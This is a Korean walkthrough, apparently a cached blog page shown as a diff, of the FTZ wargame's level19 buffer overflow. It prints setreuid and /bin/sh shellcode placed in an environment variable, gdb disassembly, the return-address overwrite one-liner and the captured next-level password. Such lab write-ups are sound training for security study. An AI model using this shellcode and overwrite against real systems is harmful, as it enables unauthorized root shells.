@@ -1,0 +1,73 @@
+I"�<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>login as: level19
+level19@~~~~<span class="s1">'s password:
+[level19@ftz level19]$ cat hint
+
+
+main()
+{ char buf[20];
+  gets(buf);
+  printf("%s\n",buf);
+}
+
+[level19@ftz level19]$
+
+</span></code></pre></div></div>
+<p>level9/swimming in pink로 접속하자. 프로그램 소스는 굉장히 심플하다.</p>
+
+<p>이전까지의 버퍼오버플로우 문제들은 setreuid 함수가 있었지만, 이번에는 없다.</p>
+
+<p>그러므로 쉘 코드에 setreuid와 bash함수가 다 포함되어 있어야 한다.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level19@ftz level19]<span class="nv">$ </span><span class="nb">export </span><span class="nv">code</span><span class="o">=</span><span class="si">$(</span>python <span class="nt">-c</span> <span class="s1">'print "\x90"*100+"\x31\xc0\xb0\x31\xcd\x80\x89\xc3\x89\xc1\x31\xc0\xb0\x46\xcd\x80"+"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31\xd2\xb0\x0b\xcd\x80"'</span><span class="si">)</span>
+</code></pre></div></div>
+<p>이제 gdb로 buf의 크기를 확인하자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level19@ftz level19]<span class="nv">$ </span>gdb <span class="nt">-q</span> attackme
+<span class="o">(</span>gdb<span class="o">)</span> <span class="nb">set </span>disas intel
+<span class="o">(</span>gdb<span class="o">)</span> disas main
+Dump of assembler code <span class="k">for function </span>main:
+0x08048440 &lt;main+0&gt;:    push   ebp
+0x08048441 &lt;main+1&gt;:    mov    ebp,esp
+0x08048443 &lt;main+3&gt;:    sub    esp,0x28
+0x08048446 &lt;main+6&gt;:    sub    esp,0xc
+0x08048449 &lt;main+9&gt;:    lea    eax,[ebp-40]
+0x0804844c &lt;main+12&gt;:   push   eax
+0x0804844d &lt;main+13&gt;:   call   0x80482f4 &lt;gets&gt;
+0x08048452 &lt;main+18&gt;:   add    esp,0x10
+0x08048455 &lt;main+21&gt;:   sub    esp,0x8
+0x08048458 &lt;main+24&gt;:   lea    eax,[ebp-40]
+0x0804845b &lt;main+27&gt;:   push   eax
+0x0804845c &lt;main+28&gt;:   push   0x80484d8
+0x08048461 &lt;main+33&gt;:   call   0x8048324 &lt;<span class="nb">printf</span><span class="o">&gt;</span>
+0x08048466 &lt;main+38&gt;:   add    esp,0x10
+0x08048469 &lt;main+41&gt;:   leave
+0x0804846a &lt;main+42&gt;:   ret
+</code></pre></div></div>
+<p>main+9에서 buf를 사용하는 것이 보인다.</p>
+
+<p>buf의 크기:ebp-40</p>
+
+<p>buf(40)+SFP(4)=44이므로 44개의 값들을 채우면 RET에 접근할 수 있다.</p>
+
+<p>환경변수의 주소값을 찾아보자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level19@ftz tmp]<span class="nv">$ </span><span class="nb">cd</span> /tmp
+<span class="o">[</span>level19@ftz tmp]<span class="nv">$ </span><span class="nb">cat </span>find.c
+<span class="c">#include&lt;stdio.h&gt;</span>
+int main<span class="o">()</span>
+<span class="o">{</span>
+        <span class="nb">printf</span><span class="o">(</span><span class="s2">"%x</span><span class="se">\n</span><span class="s2">"</span>,getenv<span class="o">(</span><span class="s2">"code"</span><span class="o">))</span><span class="p">;</span>
+<span class="o">}</span>
+<span class="o">[</span>level19@ftz tmp]<span class="nv">$ </span>./find
+bfffff1b
+<span class="o">[</span>level19@ftz tmp]<span class="err">$</span>
+</code></pre></div></div>
+<p>환경변수의 주소값:bfffff1b</p>
+
+<p>이제 코드를 작성해보자.</p>
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="o">[</span>level19@ftz level19]<span class="nv">$ </span><span class="o">(</span>python <span class="nt">-c</span> <span class="s1">'print"\x90"*44+"\x1b\xff\xff\xbf"'</span><span class="p">;</span><span class="nb">cat</span><span class="o">)</span>|./attackme
+AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA?
+my-pass
+TERM environment variable not set.
+
+Level20 Password is <span class="s2">"we are just regular guys"</span><span class="nb">.</span>
+</code></pre></div></div>
+<p>level20’s password:”we are just regular guys”</p>
+:ET
